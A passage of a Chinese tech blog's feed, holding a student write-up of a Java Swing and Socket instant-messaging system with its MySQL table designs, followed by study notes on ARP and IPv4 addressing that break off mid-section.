    <summary type="html">&lt;h4 id=&quot;目-录&quot;&gt;&lt;a href=&quot;#目-录&quot; class=&quot;headerlink&quot; title=&quot;目 录&quot;&gt;&lt;/a&gt;目 录&lt;/h4&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h4 id=&quot;第一章-总-则&quot;&gt;&lt;a href=&quot;#第一章-总-则&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    <category term="网络安全" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="法律法规" scheme="https://shierjinghuang.github.io/tags/%E6%B3%95%E5%BE%8B%E6%B3%95%E8%A7%84/"/>
    
  </entry>
  
  <entry>
    <title>Java项目 即时通讯系统</title>
    <link href="https://shierjinghuang.github.io/2023/03/18/Java%E5%AE%9E%E8%AE%AD/"/>
    <id>https://shierjinghuang.github.io/2023/03/18/Java%E5%AE%9E%E8%AE%AD/</id>
    <published>2023-03-18T01:25:00.000Z</published>
    <updated>2025-03-27T09:02:03.650Z</updated>
    
    <content type="html"><![CDATA[<h2 id="即时通讯系统"><a href="#即时通讯系统" class="headerlink" title="即时通讯系统"></a>即时通讯系统</h2><h3 id="1-系统概述"><a href="#1-系统概述" class="headerlink" title="1  系统概述"></a>1  系统概述</h3><blockquote><p><font color=blue>即时通讯是一款基于互联网的即时通讯软件，旨在为企业提供高效、安全、便捷的沟通工具。</font></p><p>本项目是一个基于Java语言开发的企业QQ系统，是基于C/S模型实现。系统可分为两个部分，服务端和客户端。服务端的工作主要是来监听和接收来自客户端的请求，然后存储并处理客户端发来的消息，并通知客户端。而客户端的功能是能够让新用户注册，通过用户名密码登陆并且使用该系统。通过服务端和客户端的协同工作最终使用户能够使用该程序，完成用户和用户之间的沟通。</p></blockquote><h4 id="1-1-功能概述"><a href="#1-1-功能概述" class="headerlink" title="1.1 功能概述"></a>1.1 功能概述</h4><ol><li><p>好友管理：支持用户进行好友添加、好友删除、修改等操作，同时也支持用户自行注册、登录、修改个人信息等操作</p></li><li><p>群组管理：支持用户创建、删除、修改群组，同时也支持用户加入、退出、查看群组等操作</p></li><li><p>即时通讯：支持用户之间的即时聊天，同时也支持群组内的多人聊天，聊天内容可以包括文字、图片、文件、表情等</p></li><li><p>安全性保障：所有数据传输均采用加密方式，保证用户信息和聊天内容的安全性</p></li><li><p>消息推送：支持消息推送功能，当有新消息到达时，系统会及时向用户发送通知，方便用户及时查看聊天记录</p></li><li><p>日志记录：系统会记录用户的聊天记录以及操作日志，方便管理员进行管理和监控</p></li></ol><h4 id="1-2-技术概述"><a href="#1-2-技术概述" class="headerlink" title="1.2 技术概述"></a>1.2 技术概述</h4><p><strong>1.2.1 Java基础知识：包括语法、面向对象编程</strong></p><p>Java具有简单性、面向对象、分布式、健壮性、安全性、平台独立与可移植性、多线程、多线程、动态性等特点。Java可以编写桌面应用程序、Web应用程序、分布式系统和嵌入式系统应用程序等</p><p><strong>1.2.2 网络编程技术Socket</strong></p><p>在本程序中为实现客户端和服务器之间的通信，使用Socket技术，socket能够通过java程序发出请求和处理网络发过来的请求。在建立双方网络连接的时候会使用到socket套接字。当网络成功建立连接后，双方都会有一个socket的实例被建立，通过使用和操作这个实例完成各种需求。对双方的连接来说，客户端和服务端并没有什·么差别socket是平等的，它们都是通过socket的实现类和它的子类来完成的</p><p>socket分为服务端和客户端两部分，服务端主要是可以监听一个特殊的端口，它能够监听并且捕获的向这个特定的端口发出的请求，这个请求就是由客户端来发起的。当连接建立之后会产生会话，完成会话之后关闭连接。而客户端主要是发起请求，它能够向某一个特定的服务器上的一个特殊的端口发起请求，然后建立连接处理会话，会话完成后和服务端一样关闭socket。客户端并不用像服务器一样规定一个特殊的打开的端口，系统会自动分配一个能够使用的端口</p><p><strong>1.2.3 数据库java.SQL与MySQL数据库</strong></p><p>Java.SQL是Java语言中用于访问关系型数据库的API，Java.SQL API提供了一组简单易用的接口和类来访问关系型数据库，使得开发者可以方便地进行数据库操作，Java.SQL API是面向对象的，它将数据库中的数据结构映射为Java中的对象，使得开发者可以使用面向对象的方式来操作数据库，Java.SQL API支持插件式的驱动程序架构，使得开发者可以通过添加新的驱动程序来支持更多的数据库类型</p><p>MySQL是一种开源的、关系型数据库管理系统（RDBMS），它是由瑞典MySQL AB公司开发的，现在属于Oracle公司旗下产品。MySQL广泛应用于Web应用程序的开发中，是目前使用最为广泛的关系型数据库之一。其具有高性能，可扩展性、简单易用、跨平台性、可靠性，被广泛应用于各种应用程序的开发中</p><p><strong>1.2.4 前端技术java.swing与java.awt</strong></p><p>Java Swing是一组用于创建图形用户界面（GUI）的Java类库。它提供了丰富的组件和工具，可以帮助开发人员构建跨平台的GUI应用程序。ava Swing提供了许多常用的GUI组件，例如按钮、文本框、下拉列表、表格等，还提供了一些高级组件，例如树形控件、分隔面板、标签页等。Java Swing提供了多种布局管理器，例如BorderLayout、FlowLayout、GridLayout等，可以帮助开发人员快速构建复杂的GUI界面</p><p><strong>1.2.5 系统及文件流操作java.io</strong></p><p>Java的核心库java.io提供了全面的IO接口。包括：文件读写、标准设备输出等。Java中IO是以流为基础进行输入输出的，所有数据被串行化写入输出流，或者从输入流读入。支持文件输入输出、网络输入输出、内存输入输出等多种方式，可以处理各种来源的数据</p><p><strong>1.2.6 各类型数据处理java.util</strong></p><p>Java.util是Java语言中一个重要的标准库，提供了许多常用的工具类和数据结构，用于处理各种数据类型、日期、时间、集合等问题。Java.util提供了众多的数据结构，如数组、列表、队列、栈、堆、哈希表、树、图等，可以满足不同场景下的数据存储和处理需求。此外提供了Date、Calendar、DateFormat、SimpleDateFormat等类，支持日期和时间的格式化、解析、计算和比较等操作</p><p><strong>1.2.7 java.long多线程设置</strong></p><p>java.lang包中的Thread类是Java实现多线程的核心类之一。通过创建Thread对象并调用其start()方法，可以启动一个新的线程并执行其中的代码</p><p>创建了一个新的线程后，会将其作为参数传递给Thread构造函数的Runnable对象中定义的代码块作为该线程的执行内容。调用start()方法后，该线程会在后台运行并执行其中的代码。除了Thread类，java.lang包中还提供了一些其他的类和接口，如Runnable接口、ThreadGroup类等，用于实现多线程编程。通过这些类和接口，可以方便地管理和控制多个线程的执行</p><h3 id="2-系统设计"><a href="#2-系统设计" class="headerlink" title="2  系统设计"></a>2  系统设计</h3><h4 id="2-1功能设计"><a href="#2-1功能设计" class="headerlink" title="2.1功能设计"></a>2.1功能设计</h4><p>系统功能框架如图2-1所示:</p><img src="./Java实训/系统功能框架.jpg" style="zoom: 67%;" /><center>图2-1系统功能框架</center>系统使用流程如图2-1所示：<img src="./Java实训/系统使用流程.jpg" alt="img" style="zoom:67%;" /><center>图2-2系统使用流程</center>即时通讯是一款基于互联网的即时通讯系统，系统分为两个部分服务端和客户端,实现基础的注册登录、好友管理、群组管理、即时通讯、日志记录、提供安全保障功能。<p>客户端为用户提供了注册登录功能，新用户通过注册账号进入即时通讯系统，系统自动展示好友列表窗体。用户根据需求通过用户账号、用户名的搜索实现好友添加，通过查看与设置好友信息实现对好友的备注、分类与管理；用户通过群号、群名的搜索想要加入的群聊，同时用户可以选取好友创建属于自己的群聊，根据需求修改群信息实现个性化群聊。</p><p>服务端实现了三大功能，界面显示功能、业务处理功能、数据传送功能。界面显示功能通过服务端的设置把控主窗体界面显示；业务处理功能管理对应的用户线程，顺利实现用户的注册、登录与退出，依托服务器连接数据库实现聊天业务的处理，完成信息的记录与查询；数据传送功能是即时聊天系统的核心功能，实现简单信息传输的同时，支持一定大小文件与图片的传输，同时为了增加交互的趣味性，支持表情包的传输，其余功能有待开发。</p><p><strong>2.1.1 登录界面</strong></p><ol><li><p>用户登录: 对输入用户名和密码进行验证。用户输入数据，发送到指定的客户端，由客户端与其相连的数据库进行比较</p></li><li><p>注册账号: 设置用户名、昵称、手机号、所在地、年龄、性别、密码并对信息进行存储</p></li></ol><p><strong>2.1.2 主界面</strong></p><ol><li><p>好友列表: 对好友分组实现创建、修改、删除；对好友实现修改备注、查看资料、清空聊天记录、置顶聊天等功能</p></li><li><p>群组列表: 对群组实现创建、解散、修改资料等功能</p></li><li><p>其他功能: 实现用户资料修改、查找/添加群和好友、查看群/好友申请列表/修改用户密码/退出登录等功能。</p></li></ol><p><strong>2.1.3聊天界面</strong></p><ul><li>实现消息发送、图片发送、表情发送、文件发送、截图、查看聊天记录、字体设置等功能。</li></ul><h4 id="2-2数据库设计"><a href="#2-2数据库设计" class="headerlink" title="2.2数据库设计"></a>2.2数据库设计</h4><p><strong>2.2.1 实体关系设计</strong></p><p>即时通讯系统采用的是MySQL数据库，然后借助数据库可视化软MySQL workbeach 创建数据库，通过相应建表语句，最后完整的设计出系统数据库。</p><p>系统数据库表基本E-R表关系如图2-2所示。</p><p>系统数据库实体属性如图2-3、图2-4、图2-5、图2-6所示。</p><img src="./Java实训/数据库基本E-R图.jpg" style="zoom:80%;" /><center>图2-2系统E-R图</center><img src="./Java实训/用户实体.jpg" style="zoom: 80%;" /><center>图2-3用户属性图</center><img src="./Java实训/好友属性E-R图.jpg" style="zoom:80%;" /><center>图2-4好友属性图</center><img src="./Java实训/消息属性E-R图.jpg" style="zoom:67%;" /><center>图2-5消息记录属性图</center><img src="./Java实训/群属性E-R图.jpg" style="zoom:80%;" /><center>图2-6群属性图</center>**2.2.2表**<p>以下列出数据库设计过程中相关表的情况。</p><ol><li>yonghu用户信息表 :该表主要用于存储注册用户的个人账号信息，主要由账号密码、性别、年龄、昵称、电话、地址、注册日期等字段组成，其表结构如表2-1所示。</li></ol><center>表2-1 yonghu表的结构</center>|   字段名   | 数据类型 | 长度 | 是否主键 |   描述   || :--------: | :------: | ---- | :------: | :------: || yonghuming | varchar  | 200  |    是    |  用户名  ||    mima    | varchar  | 200  |    否    |   密码   ||  xingbie   | varchar  | 200  |    否    |   性别   ||  nianling  | varchar  | 200  |    否    |   年龄   ||   aihao    | varchar  | 200  |    否    |   爱好   ||    role    | varchar  | 200  |    否    |   角色   ||  nicheng   | varchar  | 200  |    否    |   昵称   ||   phone    | varchar  | 200  |    否    |   电话   ||  address   | varchar  | 200  |    否    |   地址   ||  headimg   | varchar  | 200  |    否    |   头像   || registdate | varchar  | 200  |    否    | 注册日期 |<ol start="2"><li>haoyou好友表 :该表主要用于存储用户的好友信息并记录是否置顶，好友信息主要由好友名、好友备注、昵称、归属组ID组成，其表结构主要如表2-2所示。</li></ol><center>表2-2 haoyou表的结构</center>| 字段名           | 数据类型 | 长度 | 是否主键 | 描述       || :--------------- | :------: | :--: | :------: | :--------- || id               | varchar  | 200  |    是    | 好友ID     || haoyouyonghuming | varchar  | 200  |    否    | 好友用户名 || beizhuname       | varchar  | 200  |    否    | 备注名称   || nickname         | varchar  | 200  |    否    | 昵称       || zhiding          | varchar  | 200  |    否    | 是否置顶   || fenleiid         |   int    |  10  |    否    | 归属组ID   |<ol start="3"><li>qun 群组表 :该表主要记录创建的群的群号、群名、群主、群备注以及群头像，其表结构主要如表2-3所示</li></ol><center>表2-3 qun表的结构</center>| 字段名  | 数据类型 | 长度 | 是否主键 |  描述  || :-----: | :------: | :--: | :------: | :----: || qunhao  | varchar  | 200  |    是    |  群号  || qunming | varchar  | 200  |    否    |  群名  || qunzhu  | varchar  | 200  |    否    |  群主  ||  note   | varchar  | 200  |    否    |  备注  || headimg | varchar  | 200  |    否    | 群头像 |<ol start="4"><li>qunyonghu 群用户表 :该表主要记录群用户ID、用户名，以及归属群的群号，其表结构主要如表2-4所示。</li></ol><center>表2-4 qunyonghu表的结构</center>| 字段名     | 数据类型 | 长度 | 是否主键 | 描述     || ---------- | -------- | ---- | -------- | -------- || id         | varchar  | 200  | 是       | 群用户ID || qunhao     | varchar  | 200  | 否       | 归属群号 || yonghuming | varchar  | 200  | 否       | 用户名   |<ol start="5"><li>xiaoxijilu 消息记录表 :该表主要是消息记录流，记录消息的发送方、接收方、类型、内容、大小，其表结构主要如表2-5所示</li></ol><center>表2-5 xiaoxijilu表的结构</center>| 字段名        | 数据类型 | 长度 | 是否主键 | 描述     || ------------- | -------- | ---- | -------- | -------- || id            | varchar  | 200  | 是       | 编号     || fasongren     | varchar  | 200  | 否       | 发送方   || jieshouren    | varchar  | 200  | 否       | 接收方   || neirong       | varchar  | 200  | 否       | 消息内容 || leixing       | varchar  | 200  | 否       | 消息类型 || fasongshijian | varchar  | 200  | 否       | 发送时间 || size          | varchar  | 200  | 否       | 消息大小 |<ol start="6"><li>fenlei :该表主要记录用户的所属分组，主要包括用户名、归属分组名、归属分组的ID，其表结构主要如表2-6所示</li></ol><center>表2-6 fenlei表的结构</center>| 字段名    | 数据类型 | 长度 | 是否主键 |   描述   || --------- | :------: | :--: | :------: | :------: || id        |   int    |  10  |    是    |    ID    || parentid  |   int    |  10  |    否    | 归属组ID || mingcheng | varchar  | 200  |    否    |   组名   || username  | varchar  | 200  |    否    |  用户名  |<ol start="7"><li>qiandao :该表用于记录用户的上线日期，其表结构主要如表2-7所示</li></ol><center>表2-7 qiandao表的结构</center>|   字段名    | 数据类型 | 长度 | 是否主键 |   描述   || :---------: | :------: | :--: | :------: | :------: ||     id      | varchar  | 200  |    是    |    ID    || qiandaoren  | varchar  | 200  |    否    |  用户名  || qiandaoriqi | varchar  | 200  |    否    | 上线日期 |<h3 id="3-系统实现"><a href="#3-系统实现" class="headerlink" title="3  系统实现"></a>3  系统实现</h3><h4 id="3-1登录界面"><a href="#3-1登录界面" class="headerlink" title="3.1登录界面"></a>3.1登录界面</h4><p><strong>3.1.1用户登录</strong></p><p>用户登录界面如图3-1所示。</p><img src="./Java实训/用户登录界面.png"  /><center>图3-1用户登录界面图</center>页面由swing代码设计完成，通过swing的addMouseListener鼠标点击触发器，检测各功能的使用，当用户按下登录初始化一个消息对象，Message msg=new Message(textField.getText());并指定消息对象的类型为connect，并将消息发送给客户端，并开启线程监听服务器端发送信息。<p>在服务器端有Server.Task用于处理客户端发送的各种消息，当检查到消息类型为connect，进入登录审查，检查数据库签到表，如果表项不为空，说明当前账户已经在其他设备登录，返回该用户已登录信息，防之存储用户名对应的ip 端口，并查询数据库用户表项用户是否存在和密码是否正确。</p><p>如果账户密码匹配成功则返回信息，登录成功，反之返回登录失败，客户端会通过线程监听服务器返回的信息作出相应的反馈。</p><p><strong>3.1.2注册账号</strong></p><p>注册账号界面如图3-2所示。</p><img src="./Java实训/账号注册页面.png" style="zoom:67%;" /><center>图3-2注册账号界面图</center>与登录流程类似，当用户点击注册按钮，会初始化一个消息对象，消息对象的类型字段为regist，并通过java.sql将数据存储到用户表上，此外与登录页面类似<p>另外的，在上传头像上使用java.io库中的getSelectedFile函数，在本地计算机中选取图像与头像，头像的传输与其在数据库的存储则是这一项目中较为困难的点，我们在用户表中设有headimg用于经过计算得到的存储32位的头像散列，并将其一流的形式发到对应服务器的headimg中，在用户登录时也是对应将这里的数据流发送给客户端</p><h4 id="3-2主界面"><a href="#3-2主界面" class="headerlink" title="3.2主界面"></a>3.2主界面</h4><p>即时通讯系统主界面如图3-3所示。</p><img src="./Java实训/即时通讯系统主界面.png"  /><center>图3-3主界面</center>**3.2.1好友列表**<p>分组创建功能实现如图3-4所示，修改好友备注功能实现如图3-5所示。</p><img src="./Java实训/创建图片.png" style="zoom:80%;" /><center>图3-4分组创建</center><img src="./Java实训/修改备注.png"  /><center>图3-5修改备注</center>**3.2.2群组列表**<p>创建群功能实现如图3-6所示。</p><img src="./Java实训/群聊功能实现.jpg"  /><center>图3-6群创建</center>**3.2.3其他功能**<p>添加好友功能实现如图3-7所示，添加群聊功能实现如图3-8所示，好友申请列表如图3-9所示</p><img src="./Java实训/添加好友功能实现.png" style="zoom:80%;" /><center>图3-7添加好友</center><img src="./Java实训/入群申请.png" style="zoom:80%;" /><center>图3-8申请入群</center><img src="./Java实训/好友申请列表.png"  /><center>图3-9好友申请列表</center>#### 3.3聊天界面<p>私聊聊天界面如图3-10所示，群聊聊天界面如图3-11所示</p><img src="./Java实训/私聊界面.png" style="zoom:80%;" /><center>图3-10 私聊聊天界面</center>本项目作为一个模仿QQ设计的即时通讯软件，私聊与群聊毫无疑问是程序的核心，在聊天的功能基础上我们受课程原始项目启发，实现了原有项目未能实现的字体设计，图片发送与文件发送，及表情包。表情包的本质实际为预先存储于程序文件夹下的图片与图片传输没有本质区别，在两个客户端均省去了，使用java.io库中程序寻找文件和，发送文件流的过程。<p>截图功能作为老师所提供项目本就实现的功能，在原有基础上没有做太大改动。文件传输与图片传输与用户注册或修改用户信息时头像的传输方式类似，都是同msg流实现文件在网络中传输，发送的数据会记录到数据库中，而接受放客户端在接受到想用信息后会将msg流存储与/msg文件夹下，实现了信息的本地存储。</p><h4 id="3-4数据存储实现"><a href="#3-4数据存储实现" class="headerlink" title="3.4数据存储实现"></a>3.4数据存储实现</h4><p>数据存储结果如图3-12</p><img src="./Java实训/数据存储结果.jpg" style="zoom:80%;" /><center>图3-12 数据存储结果</center>**在数据库的实现过程中具体操作如下：**<ol><li><p>获取数据库连接：使用getConnection方法加载MySQL数据库驱动程序”jdbc:mysql://“+ip+”:3306/“+ dbname +”?characterEncoding=utf-8”, username, password,并通过getConnection()方法建立数据库连接</p></li><li><p>在代码中实现创建数据库和数据表，比如createStatement().execute()方法执行创建数据库命令及getConn() .createStatement().executeUpdate()方法实现数据表创建</p></li><li><p>对建立的数据库连接进行测试Connection对象的createStatement()方法创建Statement对象，使用Statement对象执行SQL语句，通过executeQuery()方法执行查询语句</p></li><li><p>创建对象，使用userService.save()实现将各种所需数据数据记录进数据表中</p></li></ol><h3 id="4-结论"><a href="#4-结论" class="headerlink" title="4  结论"></a>4  结论</h3><p>本项目是一个基于Java的企业QQ系统，实现了用户注册、登录、添加好友、聊天等基本功能。能够完成用户日常交流的需要。</p><p>通过本项目的实践，我们深入理解了Java语言和相关技术的应用，掌握了Swing、Java SQL、Java.util、MySQL、多线程等技术的使用，提高了自己的编码能力和项目开发经验。同时，本项目也为企业内部沟通和协作提供了一种新的方式，具有一定的实际应用价值。</p><h3 id="5-源代码"><a href="#5-源代码" class="headerlink" title="5 源代码"></a>5 源代码</h3><p>怎么说呢，在实训过程中找代码学习是非常麻烦的，这里我就直接放部分找到的材料源代码的百度网盘吧……</p><blockquote><p><font color=orange>链接：<a href="https://pan.baidu.com/s/1mk02u-x_Cp-ULR5G-zkLCA?pwd=pv7m">https://pan.baidu.com/s/1mk02u-x_Cp-ULR5G-zkLCA?pwd=pv7m</a> </font ><br><font color=orange>提取码：pv7m </font></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;即时通讯系统&quot;&gt;&lt;a href=&quot;#即时通讯系统&quot; class=&quot;headerlink&quot; title=&quot;即时通讯系统&quot;&gt;&lt;/a&gt;即时通讯系统&lt;/h2&gt;&lt;h3 id=&quot;1-系统概述&quot;&gt;&lt;a href=&quot;#1-系统概述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="项目设计" scheme="https://shierjinghuang.github.io/categories/%E9%A1%B9%E7%9B%AE%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="Java" scheme="https://shierjinghuang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>IPv4部分协议信息汇总</title>
    <link href="https://shierjinghuang.github.io/2022/12/15/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/"/>
    <id>https://shierjinghuang.github.io/2022/12/15/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/</id>
    <published>2022-12-15T14:13:23.000Z</published>
    <updated>2025-03-27T09:50:22.982Z</updated>
    
    <content type="html"><![CDATA[<h2 id="地址解析协议-ARP"><a href="#地址解析协议-ARP" class="headerlink" title="地址解析协议 ARP"></a>地址解析协议 ARP</h2><p>[TOC]</p><h3 id="ARP的定义与基本功能"><a href="#ARP的定义与基本功能" class="headerlink" title="ARP的定义与基本功能"></a>ARP的定义与基本功能</h3><ul><li><p>掌握ARP协议的报文格式</p></li><li><p>掌握ARP协议的工作原理</p></li><li><p>理解ARP高速缓存的作用</p></li><li><p>掌握ARP缓存表的维护过程</p></li></ul><p><strong>ARP</strong>(Address Resolution Protocol，RFC 826）是根据IP地址获取物理地址的一个TCP/IP协议。主机通过将ARP请求<strong>广播</strong>到网络上的所有主机并接收返回消息来确定目标IP地址的物理地址，同时将IP地址和硬件地址存入本机ARP缓存中，下次请求时直接查询<strong>ARP缓存</strong>。</p><h4 id="物理地址："><a href="#物理地址：" class="headerlink" title="物理地址："></a>物理地址：</h4><p>物理地址通常是由硬件来实现的，例如以太网的物理地址被写入到网卡中，任何一块网卡的物理地址是唯一的</p><blockquote><p style="color:blue;">物理地址的长度和格式取决于具体的网络，以太网的物理地址是6字节地址物理地址可以是单播地址、多播地址或广播地址。</p></blockquote><h4 id="逻辑地址："><a href="#逻辑地址：" class="headerlink" title="逻辑地址："></a>逻辑地址：</h4><p>逻辑地址与物理设备本身没有关联, 逻辑地址可以是单播地址、多播地址和广播地址。</p><blockquote><p style="color:skyblue;">目前Internet上的IPv4协议逻辑地址是32位的IP地址， IPv6地址有128位长</blockquote><h4 id="地址解析"><a href="#地址解析" class="headerlink" title="地址解析:"></a>地址解析:</h4><p>逻辑地址是在网络层使用的，但数据包是在物理网络传递。主机或路由器是通过物理地址来识别的,因此将一个数据包传递到一个主机或路由器要进行寻址，需要将一个逻辑地址映射到相应的物理地址。</p><blockquote><p style="color:blue;">地址解析就是主机在发送帧前将目的逻辑地址转换成目的物理地址的过程。</p></blockquote><h5 id="静态映射"><a href="#静态映射" class="headerlink" title="静态映射:"></a>静态映射:</h5><p>手工创建IP地址与物理地址的映射关系，建立映射表。当已知IP地址时，通过查找映射表得到对应的物理地址。</p><blockquote><p style="color:orange;">局限性: 主机更换了网卡，也就改变了主机的物理地址。当主机从一个网络移到另一个网络时，物理地址没变，但IP地址改变了。·要适应这些变化，会增大维护静态映射表的开销。</p></blockquote><h5 id="用协议实现地址映射："><a href="#用协议实现地址映射：" class="headerlink" title="用协议实现地址映射："></a>用协议实现地址映射：</h5><p>在使用TCP/IP协议的以太网中，<strong>ARP</strong>(Address Resolution Protocol)协议完成将IP地址映射到MAC地址的过程，逆地址解析协议<strong>RARP</strong>(Reverse Address Resolution Protocol)将物理地址映射为IP地址</p><h3 id="ARP的报文格式："><a href="#ARP的报文格式：" class="headerlink" title="ARP的报文格式："></a>ARP的报文格式：</h3><img src="./网际协议IP/ARP的报文格式.png"  /><p style="color:blue; text-indent: 112px;">硬件类型:16bit，定义运行ARP的网络类型，如以太网的硬件类型是1。</p><p style="color:blue; text-indent: 112px;">协议类型:16bit，定义使用ARP的高层协议，如对于IPv4协议，该字段的值是Ox0800。</p><p style="color:blue; text-indent: 112px;">硬件长度:8bit，以字节为单位的物理地址长度，如以太网硬件地址长度为6。</p><p style="color:blue; text-indent: 112px;">协议长度:8bit，以字节为单位的逻辑地址的长度，对于IPv4，该字段为4。<p><p style="color:blue; text-indent: 112px;">操作码:16bit,1表示ARP请求，2表示ARP应答。</p><p style="color:blue; text-indent: 112px;">发送端硬件地址:变长字段，对于以太网该字段长度是6字节</p><p style="color:blue; text-indent: 112px;">发送端逻辑地址:变长字段，对于IPv4地址，该字段长度为4字节。</p><p style="color:rgb(255, 118, 0); text-indent: 112px;">目的端硬件地址:变长字段，对于ARP请求报文，该字段全为0</p><p style="color:blue; text-indent: 112px;">目的端逻辑地址:变长字段，定义目标逻辑地址。</p><p style="color:black;">ARP数据报直接封装在数据链路层的帧中</p><center><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/ARP封装.png" style="zoom:80%;" /></center><h3 id="ARP的运行过程："><a href="#ARP的运行过程：" class="headerlink" title="ARP的运行过程："></a>ARP的运行过程：</h3><h4 id="数据包传输步骤"><a href="#数据包传输步骤" class="headerlink" title="数据包传输步骤"></a>数据包传输步骤</h4><blockquote><ul><li>发送端知道目的端的IP地址。</li><li>IP要求ARP创建一个ARP请求报文，其中包含了发送方的物理地址、发送方的IP地址和目的端的IP地址。目的端的物理地址用0填充</li><li>将报文传递到数据链路层，并在该层中用<strong>发送方的物理地址作为源地址</strong>，<strong>用物理广播地址作为目的地址</strong>，将其封装在一个帧中。</li><li>因为该帧中包含了一个<strong>广播</strong>目的地址，所以同一链路中的每个主机或路由器都接收到这个帧。所有接收到该帧的主机都将其传递到ARP层进行处理。<strong>除了目的端主机以外的所有主机都丢弃该报文</strong>。</li><li>目的主机用一个包含其物理地址的ARP应答报文<strong>单播</strong>做响应。</li><li>发送方接收到这个应答报文，这样它就知道了目标主机的物理地址。</li><li>将IP数据报封装在一个帧中，并单播到目的地址。</li></ul></blockquote><h3 id="ARP高速缓存："><a href="#ARP高速缓存：" class="headerlink" title="ARP高速缓存："></a>ARP高速缓存：</h3><p>当主机A通过ARP请求得到B的物理地址后就将“IP地址—MAC地址”的绑定信息存储在<strong>高速缓存</strong>中。对于后续发往E的分组，可以通过缓存得到物理地址<br>当ARP被询问一个已知IP地址节点的MAC地址时，先在ARP缓存表查看，若存在，就直接返回MAC地址，若不存在，才发送ARP请求向局域网查询。</p><h4 id="缓存表内容："><a href="#缓存表内容：" class="headerlink" title="缓存表内容："></a>缓存表内容：</h4><p>静态项目一直保留在缓存中，直到重新启动计算机为止。</p><p>动态项目随时间推移自动添加和删除，每个动态ARP缓存项的潜在生命周期是10分钟。<br>新加到缓存中的项目带有时间戳，如果某个项目添加后2分钟内没有再使用，则此项目过期并从ARP缓存中删除;<br>如果某个项目已在使用，则又收到2分钟的生命周期;<br>如果某个项目始终在使用，则会另外收到2分钟的生命周期，一直到10分钟的最长生命周期。</p><h4 id="arp命令的用法"><a href="#arp命令的用法" class="headerlink" title="arp命令的用法:"></a>arp命令的用法:</h4><p>arp命令用于对本地arp缓存进行操作，不会发送ARP请求</p><blockquote><ul><li>arp -a:              列出ARP缓存中的所有条目</li><li>arp -a ip:          列出缓存中与ip对应的条目</li><li>arp -d:              清空arp缓存</li><li>arp -d ip:          删除缓存中与ip对应的条目</li><li>arp -s ip mac : 在arp缓存中添加一个静态arp条目</li></ul></blockquote><h2 id="网际协议IP"><a href="#网际协议IP" class="headerlink" title="网际协议IP"></a>网际协议IP</h2><h3 id="IP协议简介（lP-Internet-Protocol）"><a href="#IP协议简介（lP-Internet-Protocol）" class="headerlink" title="IP协议简介（lP- Internet Protocol）"></a>IP协议简介（lP- Internet Protocol）</h3><ul><li>网际协议IP是TCP/IP最核心的协议，也是最重要的因特网标准协议之一</li><li>IP负责将数据包从源点交付到终点，所有的TCP、UDP、ICMP及IGMP数据都以IP数据报格式传输。</li></ul><h4 id="IP的特性："><a href="#IP的特性：" class="headerlink" title="IP的特性："></a>IP的特性：</h4><blockquote><p style="color:blue;">不可靠:不保证分组成功地送到目的站。任何可靠性的要求必须由上层协议实现。</p></blockquote><blockquote><p style="color:orange;">无连接:IP并不维护任何后续分组的状态信息，每个分组都是相互独立的</p></blockquote><blockquote><p style="color:red;">尽最大努力交付:IP协议尽力发送每个分组，只有当资源用完或网络出现故障时才会发送失败</p></blockquote><h4 id="IP地址及表示方法："><a href="#IP地址及表示方法：" class="headerlink" title="IP地址及表示方法："></a>IP地址及表示方法：</h4><p>IP地址：一个IP地址惟一地标识了Internet上的一台主机，IPv4协议使用32位地址，这表示地址空间是2^32。而IPv6协议使用128位地址，地址空间为2^128。<br>表示方法：点分十进制表示:每个字节用一个十进制数表示。</p><img src="./网际协议IP/IP地址分类.png"/><h5 id="网络号："><a href="#网络号：" class="headerlink" title="网络号："></a>网络号：</h5><p>D类地址和E类地址不划分网络号和主机号。</p><img src="./网际协议IP/网络号.png" style="zoom:67%;" /><h5 id="特殊的IP地址："><a href="#特殊的IP地址：" class="headerlink" title="特殊的IP地址："></a>特殊的IP地址：</h5><blockquote><p style="color:blue;">网络地址:主机号全0的IP地址，不分配给任何主机，作为网络本身的标识</p></blockquote><blockquote><p style="color:orange;">广播地址:主机号为全1的IP地址，用作广播地址，目的地址为广播地址的数据包传递给该网络中的所有节点</p></blockquote><blockquote><p style="color:skyblue;">有限广播地址:32位为全“1”的IP地址(255.255.255.255)，通常由无盘工作站启动时使用，希望从网络IP地址服务器处获得一个IP地址</p></blockquote><blockquote><p style="color:red;">主机本身地址:32位全“0”的IP地址(0.0.0.0)称为主机本身地址</p>- 当一个主机要获得其IP地址时，可以运行一个引导程序，并发送一个以全0为源地址、以全1为目的地址的分组给引导服务器，以获得本主机的IP地址。</blockquote><blockquote><p style="color:black;">环回地址:27.0.0.1称为回环地址，可用来测试TCP/IP协议是否正常工作，常用于本机上软件测试和本机上网络应用程序之间的通信地址。</p>- 使用回送地址发送数据，协议软件立即返回，不进行任何网络传输。</blockquote><h5 id="专用IP地址："><a href="#专用IP地址：" class="headerlink" title="专用IP地址："></a>专用IP地址：</h5><p>专用lIP地址:仅用于专用网内部的本地主机。<br>大多数路由器不转发携带专用IP地址的数据包，本地主机必须经网络地址转换服务器才能访问Internet。<br>专用IP地址范围: </p><img src="./网际协议IP/专用IP地址.png" style="zoom:67%;" /><h4 id="子网划分："><a href="#子网划分：" class="headerlink" title="子网划分："></a>子网划分：</h4><p><strong>Subnetting</strong><br>提高IP空间的利用率，增加IP分配的灵活性。<br>从主机号借用若干个比特作为子网号subnet-id，而主机号host-id也就相应减少若干个比特</p><p><img src="./%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86%E7%A4%BA%E6%84%8F%E5%9B%BE.png"></p><h4 id="子网掩码："><a href="#子网掩码：" class="headerlink" 